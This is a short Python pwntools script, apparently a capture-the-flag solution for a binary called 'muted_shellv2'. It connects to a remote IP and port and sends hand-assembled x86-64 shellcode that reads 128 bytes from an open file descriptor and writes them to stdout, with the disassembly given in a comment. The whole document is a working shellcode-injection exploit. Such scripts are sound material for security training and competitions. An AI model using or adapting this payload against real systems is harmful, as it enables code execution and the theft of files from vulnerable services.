#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./muted_shellv2')
libc = ELF(exe.libc.path)

io = remote("34.252.33.37", 31562)

'''
31 c0                   xor eax, eax         ; rax = 0  (sys_read)
6a 03                   push 3               ; file descriptor (fd) = 3
5f                      pop rdi              ; rdi = 3
54                      push rsp             ; buf = rsp
5e                      pop rsi              ; rsi = rsp
31 d2                   xor edx, edx         ; edx = 0
b2 80                   mov dl, 0x80         ; edx = 0x80/128 bytes
0f 05                   syscall              ; read(3, rsp, 0x80)

89 c2                   mov edx, eax         ; edx = eax = bytes read
31 c0                   xor eax, eax         ; clear eax
b0 01                   mov al, 1            ; rax = 1 (sys_write)
6a 01                   push 1               ; fd for stdout
5f                      pop rdi              ; rdi = 1
54                      push rsp             ; buf = rsp
5e                      pop rsi              ; rsi = buf
0f 05                   syscall              ; write(1, rsp, bytes_read)
'''
io.sendafter(b":", b"\x31\xc0\x6a\x03\x5f\x54\x5e\x31\xd2\xb2\x80\x0f\x05\x89\xc2\x31\xc0\xb0\x01\x6a\x01\x5f\x54\x5e\x0f\x05")

io.interactive()
